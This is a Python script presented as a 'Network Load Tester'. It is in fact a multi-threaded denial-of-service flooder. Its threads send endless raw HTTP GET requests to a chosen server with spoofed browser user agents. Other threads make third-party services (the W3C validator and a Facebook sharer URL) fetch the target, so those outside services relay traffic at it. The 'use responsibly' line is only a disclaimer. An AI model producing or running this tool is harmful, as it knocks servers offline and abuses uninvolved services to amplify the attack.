#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Network Load Tester v1.0

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

def generate_user_agents():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/89.0.4389.128 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/85.0.4183.121 Safari/537.36",
    ]
    return user_agents

def get_proxy_bots():
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u=",
    ]
    return bots

def simulate_request(url):
    try:
        while True:
            request = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(generate_user_agents())}))
            print("\033[94mSimulating traffic...\033[0m")
            time.sleep(0.1)
    except:
        time.sleep(0.1)

def send_packet(item):
    try:
        while True:
            packet = ("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(generate_user_agents()) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <-- Packet Sent! --> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mConnection closed\033[0m")
            time.sleep(0.1)
    except socket.error:
        print("\033[91mNo response! Server might be down.\033[0m")
        time.sleep(0.1)

def initiate_test():
    while True:
        item = q.get()
        send_packet(item)
        q.task_done()

def bot_activity():
    while True:
        item = w.get()
        simulate_request(random.choice(get_proxy_bots()) + "http://" + host)
        w.task_done()

def display_usage():
    print(''' \033[92m Network Load Tester v1.0
    Use responsibly. Unauthorized testing is illegal.
    Usage: python3 script.py [-s] [-p] [-t]
    -h : help
    -s : target server IP
    -p : port (default 80)
    -t : threads (default 135) \033[0m''')
    sys.exit()

def get_parameters():
    global host, port, thr
    opt_parser = OptionParser(add_help_option=False)
    opt_parser.add_option("-s", "--server", dest="host", help="Target server IP")
    opt_parser.add_option("-p", "--port", type="int", dest="port", help="Target port (default: 80)")
    opt_parser.add_option("-t", "--threads", type="int", dest="thr", help="Thread count (default: 135)")
    opt_parser.add_option("-h", "--help", dest="help", action='store_true', help="Show usage")
    opts, _ = opt_parser.parse_args()
    
    if opts.help:
        display_usage()
    
    host = opts.host if opts.host else display_usage()
    port = opts.port if opts.port else 80
    thr = opts.thr if opts.thr else 135

global data
try:
    with open("headers.txt", "r") as file:
        data = file.read()
except FileNotFoundError:
    data = ""
    print("\033[91mHeaders file missing! Using default headers.\033[0m")

q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        display_usage()
    get_parameters()
    print("\033[92m", host, " Port: ", str(port), " Threads: ", str(thr), "\033[0m")
    print("\033[94mInitializing Load Test...\033[0m")
    time.sleep(2)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error:
        print("\033[91mInvalid IP or port!\033[0m")
        display_usage()
    
    for _ in range(int(thr)):
        threading.Thread(target=initiate_test, daemon=True).start()
        threading.Thread(target=bot_activity, daemon=True).start()
    
    item = 0
    while True:
        if item > 1800:
            item = 0
            time.sleep(0.1)
        item += 1
        q.put(item)
        w.put(item)
    
    q.join()
    w.join()
